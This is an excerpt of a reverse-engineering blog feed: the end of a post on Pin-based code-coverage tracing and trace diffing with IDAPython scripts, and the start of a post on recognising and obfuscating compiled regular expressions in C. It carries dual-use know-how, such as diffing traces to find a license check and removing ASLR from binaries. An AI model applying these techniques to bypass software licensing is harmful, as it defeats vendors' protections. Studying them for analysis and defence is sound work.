</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">AskFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;*.json&#39;</span><span class="p">,</span> <span class="s">&#39;Where is the JSON report you want to load ?&#39;</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">AskStr</span><span class="p">(</span><span class="s">&#39;black&#39;</span><span class="p">,</span> <span class="s">&#39;Which color do you want ?&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span><span class='line'>    <span class="n">report</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">report</span><span class="p">[</span><span class="s">&#39;basic_blocks_info&#39;</span><span class="p">][</span><span class="s">&#39;list&#39;</span><span class="p">]:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">],</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="n">color</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">],</span> <span class="n">i</span><span class="p">[</span><span class="s">&#39;nbins&#39;</span><span class="p">],</span> <span class="n">c</span><span class="p">)</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;ok&#39;</span>
</span><span class='line'>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;fail: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;done&#39;</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is an example generated by launching &ldquo;ping google.fr&rdquo;, we can clearly see in black the nodes reached by the ping utility:</p>

<p><img class="center" src="http://doar-e.github.io/images/some_thoughts_about_code-coverage_measurement_with_pin/ping.png"></p>

<p>You can even start to generate several traces with different options, to see where each argument is handled and analyzed by the program :&ndash;).</p>

<h1>Trace differences</h1>

<p>As you saw previously, it can be handy to actually see the execution path our program took. But if you think about it, it can be even more handy to have a look at the differences between two different executions. It could be used to locate a specific feature of a program: like a license check, where an option is checked, etc.</p>

<p>Now, let&rsquo;s run another trace with for example &ldquo;ping -n 10 google.fr&rdquo;. Here are the two executions traces and the difference between the two others (the previous one, and the new):</p>

<p><img class="center" src="http://doar-e.github.io/images/some_thoughts_about_code-coverage_measurement_with_pin/pingboth.png"></p>

<p>You can clearly identify the basic blocks and the functions that use the &ldquo;-n 10&rdquo; argument.
If you look even closer, you are able very quickly to figure out where the string is converted into an integer:</p>

<p><img class="center" src="http://doar-e.github.io/images/some_thoughts_about_code-coverage_measurement_with_pin/strtoul.png"></p>

<p>A lot of software are built around a really annoying GUI (for the reverser at least): it usually generates big binaries, or ships with a lot of external modules (like Qt runtime libraries). The thing is you don&rsquo;t really care about how the GUI is working, you want to focus on the &ldquo;real&rdquo; code not on that &ldquo;noise&rdquo;. Each time you have noise somewhere, you have to figure out a way to filter that noise ; in order to only keep the interesting part. This is exactly what we are doing when we generate different execution traces of the program and the process is every time pretty the same:</p>

<ul>
<li>You launch the application, and you exit</li>
<li>You launch the application, you do something and you exit</li>
<li>You remove the basic blocks executed in the first run in the second trace ; in order to keep only the part that does the &ldquo;do something&rdquo; thing. That way you filter the noise induced by the GUI to focus only on the interesting part.</li>
</ul>


<p>Cool for us because that&rsquo;s pretty easy to implement via IDAPython, here is the script:</p>

<figure class='code'><figcaption><span>idapy_color_diff_from_jsons.py</span><a href='https://github.com/0vercl0k/stuffz/blob/master/pin-code-coverage-measure/idapy_color_diff_from_jsons.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">json</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idc</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idaapi</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">nbins</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Color &#39;nbins&#39; instructions starting from ea&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">colors</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;black&#39;</span> <span class="p">:</span> <span class="mh">0x000000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;red&#39;</span> <span class="p">:</span> <span class="mh">0x0000FF</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;blue&#39;</span> <span class="p">:</span> <span class="mh">0xFF0000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;green&#39;</span> <span class="p">:</span> <span class="mh">0x00FF00</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nbins</span><span class="p">):</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">del_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">set_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">colors</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
</span><span class='line'>        <span class="n">ea</span> <span class="o">+=</span> <span class="n">idc</span><span class="o">.</span><span class="n">ItemSize</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">AskFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;*.json&#39;</span><span class="p">,</span> <span class="s">&#39;Where is the first JSON report you want to load ?&#39;</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">report</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l1</span> <span class="o">=</span> <span class="n">report</span><span class="p">[</span><span class="s">&#39;basic_blocks_info&#39;</span><span class="p">][</span><span class="s">&#39;list&#39;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">AskFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;*.json&#39;</span><span class="p">,</span> <span class="s">&#39;Where is the second JSON report you want to load ?&#39;</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">report</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l2</span> <span class="o">=</span> <span class="n">report</span><span class="p">[</span><span class="s">&#39;basic_blocks_info&#39;</span><span class="p">][</span><span class="s">&#39;list&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">AskStr</span><span class="p">(</span><span class="s">&#39;black&#39;</span><span class="p">,</span> <span class="s">&#39;Which color do you want ?&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addresses_l1</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">l1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">addresses_l2</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">l2</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dic_l2</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">((</span><span class="n">k</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">],</span> <span class="n">k</span><span class="p">[</span><span class="s">&#39;nbins&#39;</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">l2</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">diff</span> <span class="o">=</span> <span class="n">addresses_l2</span> <span class="o">-</span> <span class="n">addresses_l1</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;</span><span class="si">%d</span><span class="s"> bbls in the first execution&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">addresses_l1</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;</span><span class="si">%d</span><span class="s"> bbls in the second execution&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">addresses_l2</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Differences between the two executions: </span><span class="si">%d</span><span class="s"> bbls&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">addresses_l1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">addresses_l2</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">funcs</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">diff</span><span class="p">:</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="n">color</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">dic_l2</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">c</span><span class="p">)</span>
</span><span class='line'>            <span class="n">funcs</span><span class="p">[</span><span class="n">get_func</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">startEA</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;fail </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;A total of </span><span class="si">%d</span><span class="s"> different sub:&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">funcs</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">funcs</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">s</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;done&#39;</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>By the way, you must keep in mind we are only talking about <strong>deterministic</strong> program (will always execute the same path if you give it the same inputs). If the same inputs aren&rsquo;t giving the exact same outputs <strong>every time</strong>, your program is not deterministic.</p>

<p>Also, don&rsquo;t forget about <a href="http://fr.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> because if you want to compare basic block addresses executed at two different times, trust me you want your binary loaded at the same base address. However, if you want to patch quickly a simple file I&rsquo;ve made a little Python script that can be handy sometimes: <a href="https://github.com/0vercl0k/stuffz/blob/master/remove_aslr_bin.py">remove_aslr_bin.py</a> ; otherwise, booting your Windows XP virtual machine is the easy solution.</p>

<h1>Does-it scale ?</h1>

<p>These tests have been done on my Windows 7 x64 laptop with Wow64 processes (4GB RAM, i7 Q720 @ 1.6GHz). All the modules living in <em>C:\Windows</em> have been blacklisted. Also, note those tests are not really accurate, I didn&rsquo;t launch each thing thousand times, it&rsquo;s just here to give you a vague idea.</p>

<h2>Portable Python 2.7.5.1</h2>

<h3>Without instrumentation</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process python.exe &quot;-c &#39;quit()&#39;&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 73,1953
</span></code></pre></td></tr></table></div></figure>


<h3>With instrumentation and JSON report serialization</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process pin.exe &quot;-t pin-code-coverage-measure.dll -o test.json -- python.exe -c &#39;quit()&#39;&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 13122,4683
</span></code></pre></td></tr></table></div></figure>


<h2>VLC 2.0.8</h2>

<h3>Without instrumentation</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process vlc.exe &quot;--play-and-exit hu&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 369,4677
</span></code></pre></td></tr></table></div></figure>


<h3>With instrumentation and JSON report serialization</h3>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>PS D:\&gt; Measure-Command {start-process pin.exe &quot;-t pin-code-coverage-measure.dll -o test.json -- D:\vlc.exe --play-and-exit hu&quot; -Wait}
</span><span class='line'>
</span><span class='line'>TotalMilliseconds : 60109,204
</span></code></pre></td></tr></table></div></figure>


<p>To optimize the process you may want to blacklist some of the VLC plugins (there are a tons!), otherwise your VLC instrumented is 160 times slower than the normal one (and I didn&rsquo;t even try to launch the instrumentation when decoding x264 videos).</p>

<h2>Browsers ?</h2>

<p>You don&rsquo;t want to see the overhead here.</p>

<h1>Conclusion</h1>

<p>If you want to use that kind of tool for fuzzing purposes, I definitely encourage you to make a little program that uses the library you are targeting the same way your target does. This way you have a really smaller and less complicate binary to instrument, thus the instrumentation process will be far more efficient. And in this specific case, I really believe you can launch this Pintool on a large set of inputs (thousands) in order to pick inputs that cover better your target. In the other hand, if you do that directly on big software like browsers: it won&rsquo;t scale because you will pass your time instrumenting GUI or stuff you don&rsquo;t care.</p>

<p>Pin is a really powerful and accessible tool. The C++ API is really easy to use, it works with Linux, OSX, Android for x86, (even X86_64 on the important targets), there is also a doxygen documentation. What else seriously ?</p>

<p>Use it, it&rsquo;s good for you.</p>

<h1>References &amp; sources of inspiration</h1>

<p>If you find that subject cool, I&rsquo;ve made a list of cool readings:</p>

<ul>
<li><a href="http://www.hexblog.com/?p=34">Coverage analyzer</a>: You will see using Pin is <strong>really</strong> easier</li>
<li><a href="https://github.com/Cr4sh/Code-coverage-analysis-tools">Code-coverage-analysis-tool</a>: That&rsquo;s cool, but it seems to instrument at the routine level ; we wanted to have information at the basic level</li>
<li><a href="http://media.blackhat.com/bh-us-11/Diskin/BH_US_11_Diskin_Binary_Instrumentation_Slides.pdf">Binary instrumentation for security professionals</a></li>
<li><a href="http://joxeankoret.com/blog/2010/05/02/mynav-a-python-plugin-for-ida-pro/">MyNav, a python plugin</a></li>
<li><a href="http://www.zynamics.com/binnavi.html#videos">zynamics BinNavi Videos</a></li>
<li><a href="http://bitblaze.cs.berkeley.edu/papers/diffslicing_oakland11.pdf">Differential Slicing: Identifying Causal Execution Differences for Security Applications</a> (thanks for the reference <a href="https://twitter.com/joancalvet">j04n</a>!)</li>
</ul>

]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Regular expressions obfuscation under the microscope]]></title>
    <link href="http://doar-e.github.io/blog/2013/08/24/regular-expressions-obfuscation-under-the-microscope/"/>
    
    <updated>2013-08-24T12:35:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2013/08/24/regular-expressions-obfuscation-under-the-microscope</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Some months ago I came across a strange couple of functions that was kind of playing with a <a href="http://en.wikipedia.org/wiki/Finite-state_machine">finite-state automaton</a> to validate an input. At first glance, I didn&rsquo;t really notice it was in fact a regex being processed, that&rsquo;s exactly why I spent quite some time to understand those routines. You are right to ask yourself: &ldquo;Hmm but the regex string representation should be in the binary shouldn&rsquo;t it?&rdquo;, the thing is it wasn&rsquo;t. The purpose of this post is to focus on those kind of &ldquo;compiled&rdquo; regex, like when the author transform somehow the regex in a FSM directly usable in its program (for the sake of efficiency I guess). And to extract that handy string representation, you have to study the automaton.</p>

<p>In this short post, we are going to see how a regular expression looks like in assembly/C, and how you can hide/obfuscate it. I hope you will enjoy the read, and you will both be able to recognize a regular expression compiled in your future reverse-engineering tasks and to obfuscate heavily your regex!</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>Bring out the FSM</h1>

<h2>Manually</h2>

<p>Before automating things, let&rsquo;s see how we can implement a simple regex in C. It&rsquo;s always easier to reverse-engineer something you have, at least once in your life, implemented. Even if the actual implementation is slightly different from the one you did.
Let&rsquo;s say we want to have an automaton that matches &ldquo;Hi-[0-9]{4}&rdquo;.</p>

<p><strong>NOTE</strong>: I just had the chance to have a conversation with <a href="https://plus.google.com/111956453297829313313">Michal</a>, and he is totally right saying that automata ins&rsquo;t <em>really</em> the regex we said it was. Here is an example of what the regex should match: &lsquo;Hi-GARBAGEGARBAGE_Hi-1234&rsquo;. We don&rsquo;t allow our regex to like rewind the state to zero if the input doesn&rsquo;t match the regex. To do so, we could replace the return statements by a &ldquo;state = 0&rdquo; statement :). Thank you to <a href="https://plus.google.com/111956453297829313313">Michal</a> for the remark.</p>

<p>Now, if from that string representation we extract an FSM, we can have that one:</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/FSM_example.png"></p>

<p>Here is this automaton implemented in C:</p>

<figure class='code'><figcaption><span> (fsm_example.c)</span> <a href='http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_example.c'>download</a></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nf">checkinput</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">state</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">do</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">switch</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">case</span> <span class="mi">0</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;H&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">1</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;i&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">2</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">==</span> <span class="sc">&#39;-&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">3</span> <span class="p">...</span> <span class="mi">6</span>:
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">&gt;=</span> <span class="sc">&#39;0&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">s</span> <span class="o">&lt;=</span> <span class="sc">&#39;9&#39;</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                <span class="k">else</span>
</span><span class='line'>                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">case</span> <span class="mi">7</span>:
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">s</span><span class="o">++</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;./fsm &lt;string&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">checkinput</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Good boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bad boy.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we try to execute the program:</p>

